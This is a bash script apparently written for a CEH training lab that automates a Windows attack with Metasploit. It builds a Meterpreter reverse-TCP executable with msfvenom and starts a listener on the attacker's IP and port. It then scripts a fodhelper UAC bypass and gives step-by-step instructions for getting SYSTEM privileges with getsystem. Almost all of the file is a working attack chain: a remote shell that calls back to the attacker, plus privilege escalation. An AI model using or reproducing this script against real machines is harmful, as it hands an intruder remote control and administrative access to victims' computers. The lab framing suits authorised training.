#!/bin/bash

# ==============================================================================
# CEH Lab 2: UAC Bypass & Privilege Escalation (Final Corrected Version)
# ==============================================================================

# lets see how to use it:)
# sudo ./script.sh   ..provide then all inputs required lhost and lport local
# it will run in that time go to windows and run the exe file there
# then after session create run below command   sometimes  ENTER if it stops
# resource escalate.rc
# # then new session will created:
# sessions -l to list all sessions:)
# here suppose your session number that is new is 3 then execute below command:)
# then initiate the session:)
# sessions -i 3       ..3 because it is new created session:)
# after that execute the below commands to escalate privilages:)
# getuid  :current user check:
# getsystem -t1     #escalate
# getuid              #again check:)



# 1. Root Check
if [[ "$EUID" -ne 0 ]]; then 
    echo "[ERROR] Please run as root (sudo su)" >&2
    exit 1
fi

# 2. Prerequisite Check
REQUIRED_CMDS=("msfvenom" "msfconsole" "python3" "realpath")
for cmd in "${REQUIRED_CMDS[@]}"; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "[ERROR] Required command '$cmd' is not installed." >&2
        exit 1
    fi
done

echo "--- Lab 2 Configuration ---"

# 3. Robust IP Validation (Python)
while true; do
    read -p "Enter Attacker IP (LHOST): " LHOST
    if python3 - "$LHOST" <<'PY'
import ipaddress, sys
try:
    ipaddress.IPv4Address(sys.argv[1])
    sys.exit(0)
except ValueError:
    sys.exit(1)
PY
    then
        break
    else
        echo "[!] Invalid IPv4 address. Please try again."
    fi
done

# Port Validation
while true; do
    read -p "Enter Attacker Port (LPORT): " LPORT
    if [[ $LPORT =~ ^[0-9]+$ ]] && [ "$LPORT" -ge 1 ] && [ "$LPORT" -le 65535 ]; then
        break
    else
        echo "[!] Invalid port. Enter 1-65535."
    fi
done

# Paths
EXE_PATH="/home/attacker/Desktop/Windows.exe"
HANDLER_RC="handler.rc"
ESCALATE_RC="escalate.rc"

# 4. Directory & Payload Generation
mkdir -p /home/attacker/Desktop || { echo "[ERROR] Directory creation failed"; exit 1; }
[[ -w /home/attacker/Desktop ]] || { echo "[ERROR] Directory not writable"; exit 1; }

echo -e "\n[*] Generating Windows Payload..."
rm -f "$EXE_PATH"
if msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > "$EXE_PATH"; then
    if [ -s "$EXE_PATH" ]; then
        echo "[+] SUCCESS: Payload located at $(realpath "$EXE_PATH")"
    else
        echo "[ERROR] Payload file is empty." >&2; exit 1
    fi
else
    echo "[ERROR] msfvenom failed." >&2; exit 1
fi

# 5. Resource File Generation
echo "[*] Creating Metasploit resource files..."

# Handler RC: Starts the listener
cat <<EOF > "$HANDLER_RC"
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
run -j
EOF

# Escalation RC: Fixed syntax (No dummy variables)
# We assume session 1 for the RC, but the user can change it manually.
cat <<EOF > "$ESCALATE_RC"
use exploit/windows/local/bypassuac_fodhelper
set session 1
set LHOST $LHOST
set TARGET 0
exploit
EOF

[[ -s "$HANDLER_RC" ]] && [[ -s "$ESCALATE_RC" ]] || { echo "[ERROR] RC files not created"; exit 1; }

echo -e "\n===================================================================="
echo "STAGE 1: ESTABLISHING CONNECTION"
echo "1. Transfer and run the file: $EXE_PATH"
echo "2. Metasploit is now launching in the foreground."
echo "3. WAIT until you see 'Meterpreter session X opened'."
echo "===================================================================="

# Launch Metasploit. The script pauses here.
msfconsole -r "$HANDLER_RC"

# The following instructions are printed if the user exits msfconsole
echo -e "\n===================================================================="
echo "STAGE 2: PRIVILEGE ESCALATION (Manual Steps inside msfconsole)"
echo "If you are still in msfconsole, follow these steps:"
echo "--------------------------------------------------------------------"
echo "1. Check your session ID:  sessions -l"
echo "2. Background the session:   background"
echo "3. Load the escalation script: resource escalate.rc"
echo "4. If session ID was not 1, type: set session <ID> (before step 3)"
echo "5. Once the new session opens, run: getsystem -t 1"
echo "6. Verify: getuid"
echo "===================================================================="
